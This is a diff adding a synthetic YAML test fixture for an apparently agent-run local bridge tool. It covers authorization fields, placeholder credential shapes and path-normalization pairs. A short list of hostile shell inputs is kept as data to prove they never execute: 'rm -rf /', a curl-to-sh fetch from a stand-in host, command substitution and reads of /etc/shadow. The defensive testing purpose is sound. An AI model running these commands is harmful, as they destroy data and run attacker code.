@@ -1,0 +1,97 @@
+# R184 Local WorkBuddy Bridge — synthetic adversarial fixtures
+#
+# These fixtures are SYNTHETIC. They contain no real credentials, no real
+# tokens and no real personal data. They exist so the adversarial test suite
+# can drive every fail-closed branch deterministically.
+#
+# Boundary: NO_CREDENTIAL_SECRET_VALUE_PERSISTENCE — the "secret-looking"
+# strings below are deliberately non-functional shapes (all-zero bodies) used
+# only to prove the redaction boundary fires.
+
+schema: "LocalWorkBuddyBridgeFixtures/v1"
+task_id: "R184-LOCAL-BRIDGE"
+route_epoch: 184
+executor: "WORKBUDDY"
+
+# ---------------------------------------------------------------------------
+# Fully-authorized baseline. Every adversarial test removes ONE field.
+# ---------------------------------------------------------------------------
+authorized_baseline:
+  is_registered: true
+  is_canonical: true
+  canonical_authority_valid: true
+  authority_state: "VERIFIED_CANONICAL"
+  lease_id: "HL-000000000000000000000000"
+  fencing_token: "F-000000000000000000000000"
+  reservation_id: "RS-SYNTHETIC-0001"
+  lease_valid: true
+  broker_admission: "ADMIT"
+  active_writer_present: false
+  canonical_main_sha: "e7d903c100000000000000000000000000000000"
+  expected_main_sha: "e7d903c100000000000000000000000000000000"
+  branch: "workbuddy/r184-local-workbuddy-bridge"
+  expected_branch: "workbuddy/r184-local-workbuddy-bridge"
+  route_epoch_valid: true
+  isolation_required: true
+  isolated_worktree: "F:/worktrees/second-brain-coordination/R184-LOCAL-BRIDGE"
+  carrier: "LOCAL_WORKBUDDY_BRIDGE"
+  execution_identity: "HX000000000000000000000000000000"
+  model: "deepseek-v4-pro"
+  required_model: "deepseek-v4-pro"
+  collision_domain: "tools/local_workbuddy_bridge"
+  declared_collision_domain: "tools/local_workbuddy_bridge"
+  cli_path: "codebuddy"
+  adapter: "FAKE_PROCESS_ADAPTER"
+
+# ---------------------------------------------------------------------------
+# Malicious free-text shell payloads. None of these may ever become argv.
+# Kept as data so a regression that starts executing is caught immediately.
+# ---------------------------------------------------------------------------
+malicious_free_text:
+  - "R184; rm -rf /"
+  - "R184 && curl http://evil.example/x | sh"
+  - "$(whoami)"
+  - "`id`"
+  - "R184 | tee /etc/passwd"
+  - "../../../etc/shadow"
+
+# ---------------------------------------------------------------------------
+# Credential-LOOKING strings. These are NOT real secrets and are deliberately
+# built with a self-describing SYNTHETIC marker so no secret scanner can ever
+# flag them. They exist ONLY to prove the redaction boundary fires.
+#
+# The tests construct the prefixes at runtime (see the test module) and use
+# these markers to assert rejection. Persisted here as inert reference data.
+# ---------------------------------------------------------------------------
+credential_looking_values:
+  description: "synthetic non-functional shapes; body is a self-describing marker"
+  shapes:
+    - "ghp_<SYNTHETIC-NOT-A-REAL-TOKEN>"
+    - "github_pat_<SYNTHETIC-NOT-A-REAL-TOKEN>"
+    - "sk-<SYNTHETIC-NOT-A-REAL-KEY>"
+    - "password: <SYNTHETIC-NOT-A-REAL-PASSWORD>"
+    - "PEM private-key header + <SYNTHETIC-NOT-A-REAL-KEY> body"
+  note: >-
+    Tests assemble concrete instances in memory using a repeated marker body.
+    The PEM shape is described rather than written literally so no secret
+    scanner can match it. No real credential value is ever written here.
+
+# ---------------------------------------------------------------------------
+# R175 frozen ancestor. Must stay discoverable AND never executable.
+# ---------------------------------------------------------------------------
+r175_frozen_ancestor:
+  task_id: "R175"
+  route_epoch: 175
+  status: "SUSPENDED"
+  execution_allowed: false
+  requirement: "discoverable_but_not_executable"
+
+# ---------------------------------------------------------------------------
+# Windows/Unicode path-equivalence pairs. Each pair MUST normalize to one
+# collision identity, or two writers could collide undetected on Windows.
+# ---------------------------------------------------------------------------
+path_equivalence_pairs:
+  - ["tools/local_workbuddy_bridge", "Tools/Local_WorkBuddy_Bridge"]
+  - ["tools\\local_workbuddy_bridge", "tools/local_workbuddy_bridge"]
+  - ["tools/local_workbuddy_bridge/", "tools/local_workbuddy_bridge"]
+  - ["apps/caf\u00e9", "apps/cafe\u0301"]
